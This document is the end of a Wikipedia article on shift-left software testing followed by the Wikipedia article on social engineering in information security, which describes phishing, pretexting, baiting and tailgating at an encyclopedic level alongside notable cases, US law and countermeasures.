There are four basic ways to shift testing earlier in the life-cycle (that is, leftward on the classic V-model). These can be referred to as traditional shift-left testing,[5] incremental shift-left testing, Agile/DevOps shift-left testing,[6][7] and model-based shift-left testing.[8]

Traditional shift-left testing[edit]
As illustrated in the following figure, traditional shift-left moves the emphasis of testing lower down (and therefore slightly to the left) on the right hand side of the classic V model. Instead of emphasizing acceptance and system level testing (e.g., GUI testing with record and playback tools[9]), traditional shift-left concentrates on unit testing and integration testing (e.g., using API testing and modern test tools). The transition to traditional shift-left testing has largely been completed.[by whom?]





Traditional shift-left testing




Incremental shift-left testing[edit]
As illustrated in the following figure, many projects developing large and complex software-reliant systems decompose development into a small number of increments (Vs) having correspondingly shorter durations. The shift-left illustrated by the dashed red arrows occurs because parts of the single, large waterfall V model’s types of testing (shown in gray) are shifted left to become increments of the corresponding types of testing in the smaller incremental V models. When each increment is also a delivery to the customer and operations, then incremental shift-left testing shifts both developmental testing and operational testing to the left. Incremental shift-left testing is popular when developing large, complex systems, especially those incorporating significant amounts of hardware. Like traditional shift-left, the transition to incremental shift-left has also been largely completed.





Incremental shift-left testing




Agile/DevOps shift-left testing[edit]
As illustrated in the following figure, Agile and DevOps projects have numerous short duration Vs (sprints) in lieu of a single or small number of V as in the previous two examples of shift-left testing. These small Vs would also be modified if one or more early sprints are used to block out the basic requirements and architecture or if test-first and test-driven development (TDD) are being performed. The shift-left occurs because the types of testing on the right sides of the earliest of these tiny Vs are to the left of the corresponding types of testing on right side of the larger V(s) they replace. While the following figure appears remarkably the same for Agile and DevOps, Agile testing is typically restricted to developmental testing and does not include operational testing, which occurs once the system is placed into operation. The transition to Agile/DevOps shift-left testing is currently popular and ongoing.





Agile/DevOps shift-left testing




Model-based shift-left testing[edit]
The previous forms all concentrated on testing earlier in the development cycle.  However, they all test after software exists and seek to uncover only implementation defects.[citation needed]
Model-based testing moves testing to the left side of the Vs, by testing requirements, architecture, and design models.  This shift begins testing almost immediately, instead of waiting a long time (traditional testing), medium time (incremental testing), or short time (Agile/DevOps) for software to become available to the right side of the Vs.  This trend is just beginning.





Model-based shift-left testing




References[edit]


^ Donald Firesmith (23 March 2015). "Four Types of Shift Left Testing". Archived from the original on 2015-09-05. Retrieved 27 March 2015.

^ Microsoft (2012). "Test Early and Often". Retrieved 27 March 2015.

^ Smith, Larry (September 2001). "Shift-Left Testing". Dr. Dobb's Journal. 26 (9): 56, 62.

^ "Sep01: Shift-Left Testing". 2014-08-10. Archived from the original on 2014-08-10. Retrieved 2019-09-06.

^ Velocity Partners (28 January 2014). "Agile Testing - The Agile Test Automation Pyramid". Retrieved 27 March 2015.

^ Paul Bahrs (6 November 2014). "Shift Left: Approaches and Practices". Retrieved 27 March 2015.

^ Dibbe Edwards (18 September 2014). "Enabling DevOps Success with Shift Left Continuous Testing". Retrieved 27 March 2015.

^ Donald Firesmith (11 November 2013). "Using V Models for Testing". Retrieved 27 March 2015.

^ Microsoft (2013). "Record and Playback Manual Tests". Retrieved 27 March 2015.


External links[edit]
"Shift Left" Devopedia
vteSoftware testingThe "box" approach
Black-box testing
All-pairs testing
Exploratory testing
Fuzz testing
Model-based testing
Scenario testing
Grey-box testing
White-box testing
API testing
Mutation testing
Static testing
Testing levels
Acceptance testing
Integration testing
System testing
Unit testing
Testing types, techniques,and tactics
A/B testing
Benchmark
Compatibility testing
Concolic testing
Concurrent testing
Conformance testing
Continuous testing
Destructive testing
Development testing
Dynamic program analysis
Installation testing
Regression testing
Security testing
Smoke testing (software)
Software performance testing
Symbolic execution
Test automation
Usability testing
See also
Graphical user interface testing
Manual testing
Orthogonal array testing
Pair testing
Soak testing
Software reliability testing
Stress testing
Web testing





Retrieved from "https://en.wikipedia.org/w/index.php?title=Shift-left_testing&oldid=1133270324"
Categories: Software testingHidden categories: Articles with short descriptionShort description is different from WikidataArticles lacking in-text citations from May 2015All articles lacking in-text citationsWikipedia articles with style issues from May 2015All articles with style issuesArticles with multiple maintenance issuesAll articles with unsourced statementsArticles with unsourced statements from October 2017Articles with specifically marked weasel-worded phrases from April 2016Articles with unsourced statements from January 2021
 



From Wikipedia, the free encyclopedia


Psychological manipulation of people into performing actions or divulging confidential information


For the influencing of attitudes and social behaviors on a large scale, see social engineering (political science).
 OPSEC alert
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
In the context of information security, social engineering is the psychological manipulation of people into performing actions or divulging confidential information. A type of confidence trick for the purpose of information gathering, fraud, or system access, it differs from a traditional "con" in that it is often one of many steps in a more complex fraud scheme.[1] It has also been defined as "any act that influences a person to take an action that may or may not be in their best interests."[2]
An example of social engineering is the use of the "forgot password" function on most websites which require login. An improperly-secured password-recovery system can be used to grant a malicious attacker full access to a user's account, while the original user will lose access to the account.


Information security culture[edit]
Employee behaviour can have a big impact on information security in organizations. Cultural concepts can help different segments of the organization work effectively or work against effectiveness towards information security within an organization. "Exploring the Relationship between Organizational Culture and Information Security Culture" provides the following definition of information security culture: "ISC is the totality of patterns of behavior in an organization that contribute to the protection of information of all kinds."[3]
Andersson and Reimers (2014) found that employees often do not see themselves as part of the organization Information Security "effort" and often take actions that ignore organizational information security best interests.[4] Research shows Information security culture needs to be improved continuously. In "Information Security Culture from Analysis to Change," authors commented that "it's a never ending process, a cycle of evaluation and change or maintenance." They suggest that to manage information security culture, five steps should be taken: Pre-evaluation, strategic planning, operative planning, implementation, and post-evaluation.[5]

Pre-Evaluation: to identify the awareness of information security within employees and to analyse current security policy.
Strategic Planning: to come up with a better awareness-program, we need to set clear targets. Clustering people is helpful to achieve it.
Operative Planning: set a good security culture based on internal communication, management-buy-in, and security awareness and training program.[5]
Implementation: four stages should be used to implement the information security culture. They are commitment of the management, communication with organizational members, courses for all organizational members, and commitment of the employees.[5]
Techniques and terms[edit]
All social engineering techniques are based on specific attributes of human decision-making known as cognitive biases.[6][7] These biases, sometimes called "bugs in the human hardware,” are exploited in various combinations to create attack techniques, some of which are listed below. The attacks used in social engineering can be used to steal employees' confidential information. The most common type of social engineering happens over the phone. Other examples of social engineering attacks are criminals posing as exterminators, fire marshals and technicians to go unnoticed as they steal company secrets.
One example of social engineering is an individual who walks into a building and posts an official-looking announcement to the company bulletin that says the number for the help desk has changed. So, when employees call for help the individual asks them for their passwords and IDs thereby gaining the ability to access the company's private information.
Another example of social engineering would be that the hacker contacts the target on a social networking site and starts a conversation with the target. Gradually the hacker gains the trust of the target and then uses that trust to get access to sensitive information like password or bank account details.[8]
Social engineering relies heavily on the six principles of influence established by Robert Cialdini. Cialdini's theory of influence is based on six key principles: reciprocity, commitment and consistency, social proof, authority, liking, scarcity.

Six key principles[edit]
Authority[edit]
In social engineering, the attacker may pose as authority to increase the likelihood of adherence from the victim.

Intimidation[edit]
Main article: Intimidation
Attacker (potentially disguised) informs or implies that there will be negative consequences if certain actions are not performed. Consequences could include subtle intimidation phrases such as "I'll tell your manager" to much worse.

Consensus/Social proof[edit]
Main article: Social proof
People will do things that they see other people are doing. For example, in one experiment[which?], one or more confederates would look up into the sky; bystanders would then look up into the sky to see what they were missing. At one point this experiment was aborted, as so many people were looking up that they stopped traffic. See conformity, and the Asch conformity experiments.

Scarcity[edit]
Main article: Scarcity (social psychology)
Perceived scarcity will generate demand. The common advertising phrase "while supplies last" capitalizes on a sense of scarcity. 

Urgency[edit]
Linked to scarcity, attackers use urgency as a time-based psychological principle of social engineering. For example, saying offers are available for a "limited time only" encourages sales through a sense of urgency.

Familiarity / Liking[edit]
Main article: Friendship
People are easily persuaded by other people whom they like. Cialdini cites the marketing of Tupperware in what might now be called viral marketing. People were more likely to buy if they liked the person selling it to them. Some of the many biases favoring more attractive people are discussed. See physical attractiveness stereotype.

Four social engineering vectors[edit]
Vishing[edit]
Vishing, otherwise known as "voice phishing", is the criminal practice of using social engineering over a telephone system to gain access to private personal and financial information from the public for the purpose of financial reward.[9] It is also employed by attackers for reconnaissance purposes to gather more detailed intelligence on a target organization.

Phishing[edit]
Main article: Phishing
Phishing is a technique of fraudulently obtaining private information. Typically, the phisher sends an e-mail that appears to come from a legitimate business—a bank, or credit card company—requesting "verification" of information and warning of some dire consequence if it is not provided. The e-mail usually contains a link to a fraudulent web page that seems legitimate—with company logos and content—and has a form requesting everything from a home address to an ATM card's PIN or a credit card number. For example, in 2003, there was a phishing scam in which users received emails supposedly from eBay claiming that the user's account was about to be suspended unless a link provided was clicked to update a credit card (information that the genuine eBay already had).[10] By mimicking a legitimate organization's HTML code and logos, it is relatively simple to make a fake Website look authentic. The scam tricked some people into thinking that eBay was requiring them to update their account information by clicking on the link provided. By indiscriminately spamming extremely large groups of people, the "phisher" counted on gaining sensitive financial information from the small percentage (yet large number) of recipients who already have eBay accounts and also fall prey to the scam.

Smishing[edit]
The act of using SMS text messaging to lure victims into a specific course of action, also known as "smishing".[11] Like phishing it can be clicking on a malicious link or divulging information. Examples are text messages that claim to be from a common carrier (like FedEx) stating a package is in transit, with a link provided.

Impersonation[edit]
Pretending or pretexting to be another person with the goal of gaining access physically to a system or building. Impersonation is used in the "SIM swap scam" fraud.

Other concepts[edit]
Pretexting[edit]
Main article: Pretexting
Pretexting (adj. pretextual) is the act of creating and using an invented scenario (the pretext) to engage a targeted victim in a manner that increases the chance the victim will divulge information or perform actions that would be unlikely in ordinary circumstances.[12] An elaborate lie, it most often involves some prior research or setup and the use of this information for impersonation (e.g., date of birth, Social Security number, last bill amount) to establish legitimacy in the mind of the target.[13] As a background, pretexting can be interpreted as the first evolution of social engineering, and continued to develop as social engineering incorporated current-day technologies. Current and past examples of pretexting demonstrate this development.
This technique can be used to fool a business into disclosing customer information as well as by private investigators to obtain telephone records, utility records, banking records and other information directly from company service representatives.[14] The information can then be used to establish even greater legitimacy under tougher questioning with a manager, e.g., to make account changes, get specific balances, etc.
Pretexting can also be used to impersonate co-workers, police, bank, tax authorities, clergy, insurance investigators—or any other individual who could have perceived authority or right-to-know in the mind of the targeted victim. The pretexter must simply prepare answers to questions that might be asked by the victim. In some cases, all that is needed is a voice that sounds authoritative, an earnest tone, and an ability to think on one's feet to create a pretextual scenario.

Vishing[edit]
Main article: Voice phishing
Phone phishing (or "vishing") uses a rogue interactive voice response (IVR) system to recreate a legitimate-sounding copy of a bank or other institution's IVR system. The victim is prompted (typically via a phishing e-mail) to call in to the "bank" via a (ideally toll free) number provided in order to "verify" information. A typical "vishing" system will reject log-ins continually, ensuring the victim enters PINs or passwords multiple times, often disclosing several different passwords. More advanced systems transfer the victim to the attacker/defrauder, who poses as a customer service agent or security expert for further questioning of the victim.

Spear phishing[edit]
Main article: Spear phishing
Although similar to "phishing", spear phishing is a technique that fraudulently obtains private information by sending highly customized emails to few end users. It is the main difference between phishing attacks because phishing campaigns focus on sending out high volumes of generalized emails with the expectation that only a few people will respond. On the other hand, spear-phishing emails require the attacker to perform additional research on their targets in order to "trick" end users into performing requested activities. The success rate of spear-phishing attacks is considerably higher than phishing attacks with people opening roughly 3% of phishing emails when compared to roughly 70% of potential attempts. When users actually open the emails phishing emails have a relatively modest 5% success rate to have the link or attachment clicked when compared to a spear-phishing attack's 50% success rate.[15]
Spear-phishing success is heavily dependent on the amount and quality of OSINT (open-source intelligence) that the attacker can obtain. Social media account activity is one example of a source of OSINT.

Water holing[edit]
Main article: Watering hole attack
Water holing is a targeted social engineering strategy that capitalizes on the trust users have in websites they regularly visit. The victim feels safe to do things they would not do in a different situation. A wary person might, for example, purposefully avoid clicking a link in an unsolicited email, but the same person would not hesitate to follow a link on a website they often visit. So, the attacker prepares a trap for the unwary prey at a favored watering hole. This strategy has been successfully used to gain access to some (supposedly) very secure systems.[16]
The attacker may set out by identifying a group or individuals to target. The preparation involves gathering information about websites the targets often visit from the secure system. The information gathering confirms that the targets visit the websites and that the system allows such visits. The attacker then tests these websites for vulnerabilities to inject code that may infect a visitor's system with malware. The injected code trap and malware may be tailored to the specific target group and the specific systems they use. In time, one or more members of the target group will get infected and the attacker can gain access to the secure system.

Baiting[edit]
Baiting is like the real-world Trojan horse that uses physical media and relies on the curiosity or greed of the victim.[17] In this attack, attackers leave malware-infected floppy disks, CD-ROMs, or USB flash drives in locations people will find them (bathrooms, elevators, sidewalks, parking lots, etc.), give them legitimate and curiosity-piquing labels, and wait for victims.
For example, an attacker may create a disk featuring a corporate logo, available from the target's website, and label it "Executive Salary Summary Q2 2012". The attacker then leaves the disk on the floor of an elevator or somewhere in the lobby of the target company. An unknowing employee may find it and insert the disk into a computer to satisfy their curiosity, or a good Samaritan may find it and return it to the company. In any case, just inserting the disk into a computer installs malware, giving attackers access to the victim's PC and, perhaps, the target company's internal computer network.
Unless computer controls block infections, insertion compromises PCs "auto-running" media. Hostile devices can also be used.[18] For instance, a "lucky winner" is sent a free digital audio player compromising any computer it is plugged to. A "road apple" (the colloquial term for horse manure, suggesting the device's undesirable nature) is any removable media with malicious software left in opportunistic or conspicuous places. It may be a CD, DVD, or USB flash drive, among other media. Curious people take it and plug it into a computer, infecting the host and any attached networks. Again, hackers may give them enticing labels, such as "Employee Salaries" or "Confidential".[19]
One study done in 2016 had researchers drop 297 USB drives around the campus of the University of Illinois. The drives contained files on them that linked to webpages owned by the researchers. The researchers were able to see how many of the drives had files on them opened, but not how many were inserted into a computer without having a file opened. Of the 297 drives that were dropped, 290 (98%) of them were picked up and 135 (45%) of them "called home".[20]

Quid pro quo[edit]
Quid pro quo means something for something:

An attacker calls random numbers at a company, claiming to be calling back from technical support. Eventually this person will hit someone with a legitimate problem, grateful that someone is calling back to help them. The attacker will "help" solve the problem and, in the process, have the user type commands that give the attacker access or launch malware.
In a 2003 information security survey, 91% of office workers gave researchers what they claimed was their password in answer to a survey question in exchange for a cheap pen.[21] Similar surveys in later years obtained similar results using chocolates and other cheap lures, although they made no attempt to validate the passwords.[22]
Tailgating[edit]
Main article: Piggybacking (security)
An attacker, seeking entry to a restricted area secured by unattended, electronic access control, e.g. by RFID card, simply walks in behind a person who has legitimate access. Following common courtesy, the legitimate person will usually hold the door open for the attacker or the attackers themselves may ask the employee to hold it open for them. The attacker will often purport to be on a phone call using a mobile to prevent questioning by an employee. The legitimate person may fail to ask for identification for any of several reasons, or may accept an assertion that the attacker has forgotten or lost the appropriate identity token. The attacker may also fake the action of presenting an identity token. 

Other types[edit]
Common confidence tricksters or fraudsters also could be considered "social engineers" in the wider sense, in that they deliberately deceive and manipulate people, exploiting human weaknesses to obtain personal benefit. They may, for example, use social engineering techniques as part of an IT fraud.
As of the early 2000s, another type of social engineering technique includes spoofing or hacking IDs of people having popular e-mail IDs such as Yahoo!, Gmail, or Hotmail. Additionally, some spoofing attempts included emails from major online service providers, like PayPal.[23] This led to the "proposed standard" of Sender Policy Framework RFC 7208 dated April 2014, in combination with DMARC, as means to combat spoofing. Among the many motivations for this deception are:

Phishing credit-card account numbers and their passwords.
Cracking private e-mails and chat histories, and manipulating them by using common editing techniques before using them to extort money and creating distrust among individuals.
Cracking websites of companies or organizations and destroying their reputation.
Computer virus hoaxes
Convincing users to run malicious code within the web browser via self-XSS attack to allow access to their web account
Another type is to read sensitive information of unshielded or unprotected Displays and input devices, called Shoulder surfing.

Countermeasures[edit]
Organizations reduce their security risks by:
Training to Employees: Training employees in security protocols relevant to their position. (e.g., in situations such as tailgating, if a person's identity cannot be verified, then employees must be trained to politely refuse.)
Standard Framework: Establishing frameworks of trust on an employee/personnel level (i.e., specify and train personnel when/where/why/how sensitive information should be handled)
Scrutinizing Information: Identifying which information is sensitive and evaluating its exposure to social engineering and breakdowns in security systems (building, computer system, etc.)
Security Protocols: Establishing security protocols, policies, and procedures for handling sensitive information.
Event Test: Performing unannounced, periodic tests of the security framework.
Inoculation: Preventing social engineering and other fraudulent tricks or traps by instilling a resistance to persuasion attempts through exposure to similar or related attempts.[24]
Review: Reviewing the above steps regularly: no solutions to information integrity are perfect.[25]
Waste Management: Using a waste management service that has dumpsters with locks on them, with keys to them limited only to the waste management company and the cleaning staff. Locating the dumpster either in view of employees so that trying to access it carries a risk of being seen or caught, or behind a locked gate or fence where the person must trespass before they can attempt to access the dumpster.[26]

The lifecycle of social engineering[edit]
Information gathering: Information gathering is the first and foremost step of the lifecycle. It requires much patience and keenly watching habits of the victim. This step gathering data about the victim's interests, personal information. It determines the success rate of the overall attack.
Engaging with victim: After gathering required amount of information, the attacker opens a conversation with the victim smoothly without the victim finding anything inappropriate.
Attacking: This step generally occurs after a long period of engaging with the target and during this information from the target is retrieved by using social engineering. In phase, the attacker gets the results from the target.
Closing interaction: This is the last step which includes slowly shutting down the communication by the attacker without arising any suspicion in the victim. In this way, the motive is fulfilled as well as the victim rarely realizes the attack even happened.[27]
Notable social engineers[edit]
Frank Abagnale Jr.[edit]
Frank Abagnale Jr. is an American security consultant known for his background as a former con man, check forger, and impostor while he was between the ages of 15 and 21. He became one of the most notorious impostors,[28] claiming to have assumed no fewer than eight identities, including an airline pilot, a physician, a U.S. Bureau of Prisons agent, and a lawyer. Abagnale escaped from police custody twice (once from a taxiing airliner and once from a U.S. federal penitentiary) before turning 22 years old.[29] The popular Steven Spielberg movie Catch Me If You Can is based on his life.

Kevin Mitnick[edit]
Kevin Mitnick is an American computer security consultant, author and hacker, best known for his high-profile 1995 arrest and later five-year conviction for various computer and communications-related crimes.[30]

Susan Headley[edit]
Susan Headley was an American hacker active during the late 1970s and early 1980s widely respected for her expertise in social engineering, pretexting, and psychological subversion.[31] She was known for her specialty in breaking into military computer systems, which often involved going to bed with military personnel and going through their clothes for usernames and passwords while they slept.[32] She became heavily involved in phreaking with Kevin Mitnick and Lewis de Payne in Los Angeles, but later framed them for erasing the system files at US Leasing after a falling out, leading to Mitnick's first conviction. She retired to professional poker.[33]

James Linton[edit]
James Linton is a British hacker and social engineer who in 2017 used OSINT and spear phishing techniques to trick a variety of targets over email including the CEOs of Major Banks, and members of the Trump White House Administration. He then went to work in email security where he socially engineered BEC (Business Email Compromise) threat actors to collect specific threat intelligence.

Mike Ridpath[edit]
Mike Ridpath Security consultant, published author, and speaker. Previous member of w00w00. Emphasizes techniques and tactics for social engineering cold calling. Became notable after his talks where he would play recorded calls and explain his thought process on what he was doing to get passwords through the phone and his live demonstrations.[34][35][36][37][38] As a child Ridpath was connected with Badir Brothers and was widely known within the phreaking and hacking community for his articles with popular underground ezines, such as, Phrack, B4B0 and 9x on modifying Oki 900s, blueboxing, satellite hacking and RCMAC.[39][40]

Badir Brothers[edit]
Brothers Ramy, Muzher, and Shadde Badir—all of whom were blind from birth—managed to set up an extensive phone and computer fraud scheme in Israel in the 1990s using social engineering, voice impersonation, and Braille-display computers.[41][42]

Christopher J. Hadnagy[edit]
Christopher J. Hadnagy is an American social engineer and information technology security consultant.  He is best known as an author of 4 books on social engineering and cyber security[43][44][45][46] and founder of Innocent Lives Foundation, an organization that helps tracking and identifying child trafficking using various security techniques such as seeking the assistance of information security specialists, utilizing data from open-source intelligence (OSINT) and collaborating with law enforcement.[47][48]

Law[edit]
In common law, pretexting is an invasion of privacy tort of appropriation.[49]

Pretexting of telephone records[edit]
In December 2006, United States Congress approved a Senate sponsored bill making the pretexting of telephone records a federal felony with fines of up to $250,000 and ten years in prison for individuals (or fines of up to $500,000 for companies). It was signed by President George W. Bush on 12 January 2007.[50]

Federal legislation[edit]
The 1999 "GLBA" is a U.S. Federal law that specifically addresses pretexting of banking records as an illegal act punishable under federal statutes. When a business entity such as a private investigator, SIU insurance investigator, or an adjuster conducts any type of deception, it falls under the authority of the Federal Trade Commission (FTC). This federal agency has the obligation and authority to ensure that consumers are not subjected to any unfair or deceptive business practices. US Federal Trade Commission Act, Section 5 of the FTCA states, in part:
"Whenever the Commission shall have reason to believe that any such person, partnership, or corporation has been or is using any unfair method of competition or unfair or deceptive act or practice in or affecting commerce, and if it shall appear to the Commission that a proceeding by it in respect thereof would be to the interest of the public, it shall issue and serve upon such person, partnership, or corporation a complaint stating its charges in that respect."
The statute states that when someone obtains any personal, non-public information from a financial institution or the consumer, their action is subject to the statute. It relates to the consumer's relationship with the financial institution. For example, a pretexter using false pretenses either to get a consumer's address from the consumer's bank, or to get a consumer to disclose the name of their bank, would be covered. The determining principle is that pretexting only occurs when information is obtained through false pretenses.
While the sale of cell telephone records has gained significant media attention, and telecommunications records are the focus of the two bills currently before the United States Senate, many other types of private records are being bought and sold in the public market. Alongside many advertisements for cell phone records, wireline records and the records associated with calling cards are advertised. As individuals shift to VoIP telephones, it is safe to assume that those records will be offered for sale as well. Currently, it is legal to sell telephone records, but illegal to obtain them.[51]

1st Source Information Specialists[edit]
U.S. Rep. Fred Upton (R-Kalamazoo, Michigan), chairman of the Energy and Commerce Subcommittee on Telecommunications and the Internet, expressed concern over the easy access to personal mobile phone records on the Internet during a House Energy & Commerce Committee hearing on "Phone Records For Sale: Why Aren't Phone Records Safe From Pretexting?" Illinois became the first state to sue an online records broker when Attorney General Lisa Madigan sued 1st Source Information Specialists, Inc. A spokeswoman for Madigan's office said. The Florida-based company operates several Web sites that sell mobile telephone records, according to a copy of the suit. The attorneys general of Florida and Missouri quickly followed Madigan's lead, filing suits respectively, against 1st Source Information Specialists and, in Missouri's case, one other records broker – First Data Solutions, Inc.
Several wireless providers, including T-Mobile, Verizon, and Cingular filed earlier lawsuits against records brokers, with Cingular winning an injunction against First Data Solutions and 1st Source Information Specialists. U.S. Senator Charles Schumer (D-New York) introduced legislation in February 2006 aimed at curbing the practice. The Consumer Telephone Records Protection Act of 2006 would create felony criminal penalties for stealing and selling the records of mobile phone, landline, and Voice over Internet Protocol (VoIP) subscribers.

Hewlett Packard[edit]
Patricia Dunn, former chairwoman of Hewlett Packard, reported that the HP board hired a private investigation company to delve into who was responsible for leaks within the board. Dunn acknowledged that the company used the practice of pretexting to solicit the telephone records of board members and journalists. Chairman Dunn later apologized for this act and offered to step down from the board if it was desired by board members.[52] Unlike Federal law, California law specifically forbids such pretexting. The four felony charges brought on Dunn were dismissed.[53]

Preventive measures[edit]
Taking some precautions reduces the risk of being a victim of social engineering frauds. The precautions that can be made are as follows:

Be aware of offers that seem  "Too good to be true".
Use multifactor authentication.
Avoid clicking on attachments from unknown sources.
Not giving out personal or financial information (such as credit card information, Social Security Numbers, or bank account information) to anyone via email, phone, or text messages.
Use of spam filter software.
Avoid befriending people that you do not know in real life.
Teach kids to contact a trusted adult in case they are being bullied over the internet (cyberbullying) or feel threatened by anything online.[54]
Don't make instant decisions, but when possible take 5 minutes to evaluate the information presented.
See also[edit]
Certified Social Engineering Prevention Specialist (CSEPS)
Code Shikara – Computer worm
Confidence trick – Attempt to defraud a person or group after first gaining their confidence
Countermeasure (computer) – Process to reduce a security threat
Cyber-HUMINT – Set of skills used by cyberspace hackers
Cyberheist
Inoculation theory – How people's attitudes can resist change through weak counterargument exposures
Internet Security Awareness Training
IT risk – Any risk related to information technology
Media prank – Type of media events, which often use similar tactics (though usually not for criminal purposes)
Penetration test – Method of evaluating computer and network security by simulating a cyber attack
Phishing – Attempt to trick a person into revealing information
Physical information security – Common ground of physical and information security
Piggybacking (security)
SMS phishing
Threat (computer) – Potential negative action or event facilitated by a vulnerability
Voice phishing – Phishing attack via telephony
Vulnerability (computing) – Exploitable weakness in a computer system
Cyber security awareness
References[edit]


^ Anderson, Ross J. (2008). Security engineering: a guide to building dependable distributed systems (2 ed.). Indianapolis, IN: Wiley. p. 1040. ISBN 978-0-470-06852-6. Chapter 2, page 17

^ "Social Engineering Defined". Security Through Education. Retrieved 3 October 2021.

^ Lim, Joo S., et al. "Exploring the Relationship between Organizational Culture and Information Security Culture." Australian Information Security Management Conference.

^ Andersson, D., Reimers, K. and Barretto, C. (March 2014). Post-Secondary Education Network Security: Results of Addressing the End-User Challenge.publication date 11 March 2014 publication description INTED2014 (International Technology, Education, and Development Conference)

^ a b c Schlienger, Thomas; Teufel, Stephanie (2003). "Information security culture-from analysis to change". South African Computer Journal. 31: 46–52.

^ Jaco, K: "CSEPS Course Workbook" (2004), unit 3, Jaco Security Publishing.

^ Kirdemir, Baris (2019). "HOSTILE INFLUENCE AND EMERGING COGNITIVE THREATS IN CYBERSPACE". Centre for Economics and Foreign Policy Studies.

^ Hatfield, Joseph M (June 2019). "Virtuous human hacking: The ethics of social engineering in penetration-testing". Computers & Security. 83: 354–366. doi:10.1016/j.cose.2019.02.012. S2CID 86565713.

^ Choi, Kwan; Lee, Ju-lak; Chun, Yong-tae (1 May 2017). "Voice phishing fraud and its modus operandi". Security Journal. 30 (2): 454–466. doi:10.1057/sj.2014.49. ISSN 0955-1662. S2CID 154080668.

^ Austen, Ian (7 March 2005). "On EBay, E-Mail Phishers Find a Well-Stocked Pond". The New York Times. ISSN 0362-4331. Retrieved 1 May 2021.

^ Steinmetz, Kevin F.; Holt, Thomas J. (5 August 2022). "Falling for Social Engineering: A Qualitative Analysis of Social Engineering Policy Recommendations". Social Science Computer Review: 089443932211175. doi:10.1177/08944393221117501. ISSN 0894-4393. S2CID 251420893.

^ The story of HP pretexting scandal with discussion is available at Davani, Faraz (14 August 2011). "HP Pretexting Scandal by Faraz Davani". Retrieved 15 August 2011 – via Scribd.

^ "Pretexting: Your Personal Information Revealed", Federal Trade Commission

^ Fagone, Jason (24 November 2015). "The Serial Swatter". The New York Times. Retrieved 25 November 2015.

^ "The Real Dangers of Spear-Phishing Attacks". FireEye. 2016. Retrieved 9 October 2016.

^ "Chinese Espionage Campaign Compromises Forbes.com to Target US Defense, Financial Services Companies in Watering Hole Style Attack". invincea.com. 10 February 2015. Retrieved 23 February 2017.

^ "Social Engineering, the USB Way". Light Reading Inc. 7 June 2006. Archived from the original on 13 July 2006. Retrieved 23 April 2014.

^ "Archived copy" (PDF). Archived from the original (PDF) on 11 October 2007. Retrieved 2 March 2012.{{cite web}}:  CS1 maint: archived copy as title (link)

^ Conklin, Wm. Arthur; White, Greg; Cothren, Chuck; Davis, Roger; Williams, Dwayne (2015). Principles of Computer Security, Fourth Edition (Official Comptia Guide). New York: McGraw-Hill Education. pp. 193–194. ISBN 978-0071835978.

^ Raywood, Dan (4 August 2016). "#BHUSA Dropped USB Experiment Detailed". info security. Retrieved 28 July 2017.

^ Leyden, John (18 April 2003). "Office workers give away passwords". The Register. Retrieved 11 April 2012.

^ "Passwords revealed by sweet deal". BBC News. 20 April 2004. Retrieved 11 April 2012.

^ "Email Spoofing – What it Is, How it Works & More - Proofpoint US". www.proofpoint.com. 26 February 2021. Retrieved 11 October 2021.

^ Treglia, J., & Delia, M. (2017). Cyber Security Inoculation. Presented at NYS Cyber Security Conference, Empire State Plaza Convention Center, Albany, NY, 3–4 June.

^ Mitnick, K., & Simon, W.  (2005).  "The Art of Intrusion". Indianapolis, IN: Wiley Publishing.

^ Allsopp, William. Unauthorised access: Physical penetration testing for it security teams. Hoboken, NJ: Wiley, 2009. 240–241.

^ "social engineering – GW Information Security Blog". blogs.gwu.edu. Retrieved 18 February 2020.

^ Salinger, Lawrence M. (2005). Encyclopedia of White-Collar & Corporate Crime. SAGE. ISBN 978-0-7619-3004-4.

^ "How Frank Abagnale Would Swindle You". U.S. News. 17 December 2019. Archived from the original on 28 April 2013. Retrieved 17 December 2019.

^ "Kevin Mitnick sentenced to nearly four years in prison; computer hacker ordered to pay restitution to victim companies whose systems were compromised" (Press release). United States Attorney's Office, Central District of California. 9 August 1999. Archived from the original on 13 June 2013.

^ "DEF CON III Archives – Susan Thunder Keynote". DEF CON. Retrieved 12 August 2017.

^ "CDNE Chapter 14 - Female Hackers?". Archived from the original on 17 April 2001. Retrieved 6 January 2007.

^ Hafner, Katie (August 1995). "Kevin Mitnick, unplugged". Esquire. 124 (2): 80(9).

^ Social Engineering: Manipulating the human. Scorpio Net Security Services. 16 May 2013. ISBN 9789351261827. Retrieved 11 April 2012.

^ Niekerk, Brett van. "Mobile Devices and the Military: useful Tool or Significant Threat". Proceedings of the 4Th Workshop on Ict Uses in Warfare and the Safeguarding of Peace 2012 (Iwsp 2012) and Journal of Information Warfare. academia.edu. Retrieved 11 May 2013.

^ "Social Engineering: Manipulating the human". YouTube. Retrieved 11 April 2012.

^ "BsidesPDX Track 1 10/07/11 02:52PM, BsidesPDX Track 1 10/07/11 02:52PM BsidesPDX on USTREAM. Conference". Ustream.tv. 7 October 2011. Archived from the original on 4 August 2012. Retrieved 11 April 2012.

^ "Automated Social Engineering". BrightTALK. 29 September 2011. Retrieved 11 April 2012.

^ "Social Engineering a General Approach" (PDF). Informatica Economica journal. Retrieved 11 January 2015.

^ "Cyber Crime". Hays. Retrieved 11 January 2020.

^ "Wired 12.02: Three Blind Phreaks". Wired. 14 June 1999. Retrieved 11 April 2012.

